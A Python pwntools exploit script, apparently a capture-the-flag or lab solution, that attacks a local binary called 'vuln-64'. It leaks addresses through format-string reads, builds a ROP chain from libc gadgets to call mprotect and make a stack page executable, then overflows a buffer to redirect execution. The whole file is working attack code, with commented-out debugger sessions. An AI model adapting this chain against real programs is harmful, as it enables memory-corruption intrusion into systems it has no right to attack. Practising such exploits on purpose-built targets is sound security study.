#!/usr/bin/env python
from pwn import *

#Set up the process
context(os='linux', arch='amd64')
p = process('./vuln-64')

payload1 = b'%11$p'
p.sendline(payload1)

win = int(p.recvline()[:-1], 16)

#libc library
libc = p.libs()['/usr/lib/x86_64-linux-gnu/libc.so.6']

mprotect = libc + 0x1010f0
overflow = b'A' * 80

#ROP gadgets, need to add the libc for proper addressing
pop_rdi = libc + 0x27c65
pop_rsi = libc + 0x29419
pop_rdx = libc + 0xfd6bd

p.clean()
payload2 = b'%7$p'
p.sendline(payload2)

page = int(p.recvline()[:-4] + b'000', 16)
rdi = page
rsi = 4096
rdx = 7

print("libc", hex(libc))
print("pop rdi", hex(pop_rdi))
print("pop rsi", hex(pop_rsi))
print("pop rdx", hex(pop_rdx))
print("mprotect", hex(mprotect))

#Setting up payload for buffer overflow
# pop rdi [rdi] pop rsi [rsi] pop rdx [rdx] mprotect [ret addr] overflow [add 2 to ret addr]
bufexploit = bytearray(b'')
bufexploit.extend(pop_rdi.to_bytes(8, byteorder='little'))
bufexploit.extend(rdi.to_bytes(8, byteorder='little'))
bufexploit.extend(pop_rsi.to_bytes(8, byteorder='little'))
bufexploit.extend(rsi.to_bytes(8, byteorder='little'))
bufexploit.extend(pop_rdx.to_bytes(8, byteorder='little'))
bufexploit.extend(rdx.to_bytes(8, byteorder='little'))
bufexploit.extend(mprotect.to_bytes(8, byteorder='little'))
bufexploit.extend(win.to_bytes(8, byteorder='little'))
bufexploit.extend(overflow)
#adjusts the rsp after executing $rsp
stack_pivot = win + 0x2
bufexploit.extend(stack_pivot.to_bytes(8, byteorder='little'))


#pid = gdb.attach(p, '''
#    up
#    b 41
#    info registers
#    
#''')
#pid = gdb.attach(p, '''
#    up
#    break mprotect
#    continue
#    p/x $rdi
#    p/x $rsi
#    p/x $rdx
#''')


print("Sending exploit...")
p.clean()
p.sendline(bufexploit)
time.sleep(0.5)
p.sendline(b'')
print(p.recvline())


#Close the process
p.close()

